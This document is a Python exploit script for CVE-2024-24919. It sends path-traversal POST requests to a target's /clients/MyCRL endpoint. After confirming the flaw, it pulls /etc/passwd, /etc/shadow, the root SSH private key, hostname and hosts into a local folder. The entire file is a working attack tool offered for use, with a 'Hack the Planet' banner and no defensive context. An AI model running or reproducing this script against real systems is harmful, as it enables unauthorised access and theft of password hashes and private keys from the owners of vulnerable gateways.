import requests
import argparse
import sys
import subprocess
import urllib3
import os

urllib3.disable_warnings((urllib3.exceptions.InsecureRequestWarning))

def ascii():
    art = print("""   _  _         _     _   _          ___ _       
 | || |__ _ __| |__ | |_| |_  ___  | _ \ |__ _ _ _  ___| |_ 
 | __ / _` / _| / / |  _| ' \/ -_) |  _/ / _` | ' \/ -_)  _|
 |_||_\__,_\__|_\_\  \__|_||_\___| |_| |_\__,_|_||_\___|\__|
""")
    return art 
    
def exploit(targetIP):
    
    finalUrl = f"https://{targetIP}/clients/MyCRL"
    
    data = f"aCSHELL/../../../../../../../../../../../../../../../../../etc/passwd"
    
    # Make the POST request
    print("\033[92m[+] Checking the target \033[0m")
    response = requests.post(finalUrl, data=data, verify=False)
    
    # Check if the request was successful
    if response.status_code == 200:
        if 'root' in response.text:
            print("\033[92mTarget is vulnerable!! \033[0m \n")
            
            #Getting the user input to exploit or not
            getUserChoice = input("\033[92mExtract secrets? (Y)es or (N)o \033[0m \n") 
            if getUserChoice.lower() in ["y", "yes"]:
                secrets(finalUrl,targetIP)
            else:
                sys.exit("Exiting..")
    else:
        print("\033[91mTarget might not be vulnerable...\033[0m")
        sys.exit("Exiting..")
        
def secrets(finalUrl,targetIP):
    
    #Make the directory
    os.makedirs(targetIP, exist_ok=True)
    
    print("\033[92m[+] Extracting the secrets from target....\033[0m")
    
    dataPasswd = f"aCSHELL/../../../../../../../../../../../../../../../../../etc/passwd"
    dataShadow = f"aCSHELL/../../../../../../../../../../../../../../../../../etc/shadow"
    dataidrsa = f"aCSHELL/../../../../../../../../../../../../../../../../../root/.ssh/id_rsa"
    dataHostname = f"aCSHELL/../../../../../../../../../../../../../../../../../etc/hostname"
    dataHosts = f"aCSHELL/../../../../../../../../../../../../../../../../../etc/hosts"
    
    # Fetching passwd file
    passwd = requests.post(finalUrl, data=dataPasswd, verify=False)
    # Check if the request was successful
    if passwd.status_code == 200:
        if 'root' in passwd.text:
            print("\033[92mPasswd file found!\033[0m")
            # Step 3: Store the response
            file_path = os.path.join(targetIP, "passwd")
            with open(file_path, "w") as file:
                file.write(passwd.text)
        else:
            print("\033[91mPasswd file not found\033[0m")
    
    # Fetching shadow file
    shadow = requests.post(finalUrl, data=dataShadow, verify=False)
    # Check if the request was successful
    if shadow.status_code == 200:
        if 'root' in shadow.text:
            print("\033[92mShadow file found!\033[0m")
            # Step 3: Store the response
            file_path = os.path.join(targetIP, "shadow")
            with open(file_path, "w") as file:
                file.write(shadow.text)
        else:
            print("\033[91mShadow file not found\033[0m")
    
    # Fetching root ssh key
    id_rsa = requests.post(finalUrl, data=dataidrsa, verify=False)
    # Check if the request was successful
    if id_rsa.status_code == 200:
        print("\033[92mRoot SSH key found!\033[0m")
        # Step 3: Store the response
        file_path = os.path.join(targetIP, "id_rsa")
        with open(file_path, "w") as file:
            file.write(id_rsa.text)
    else:
        print("\033[91mRoot SSH key not found\033[0m")
        
    # Fetching hostname file
    hostname = requests.post(finalUrl, data=dataHostname, verify=False)
    # Check if the request was successful
    if hostname.status_code == 200:
        print("\033[92mHostname file found!\033[0m")
        # Step 3: Store the response
        file_path = os.path.join(targetIP, "hostname")
        with open(file_path, "w") as file:
            file.write(hostname.text)
    else:
        print("\033[91mHostname file not found\033[0m")
        
    # Fetching hosts file
    hosts = requests.post(finalUrl, data=dataHosts, verify=False)
    # Check if the request was successful
    if hosts.status_code == 200:
        print("\033[92mHosts file found!\033[0m")
        # Step 3: Store the response
        file_path = os.path.join(targetIP, "hosts")
        with open(file_path, "w") as file:
            file.write(hosts.text)
    else:
        print("\033[91mHosts file not found\033[0m")
            
    print(f"\033[92m[+] Secrets stored in {targetIP} directory!!\033[0m")
    
def main():
    parser = argparse.ArgumentParser(description="CVE-2024-24919")
    parser.add_argument("-i", '--targetIP', required=True, help="The target IP")
    args = parser.parse_args()
    try:
        ascii()
        return(exploit(args.targetIP))
            
    except Exception as e:
        sys.exit(f"Some error occured: {e}")
        
if __name__ == "__main__":
    main()
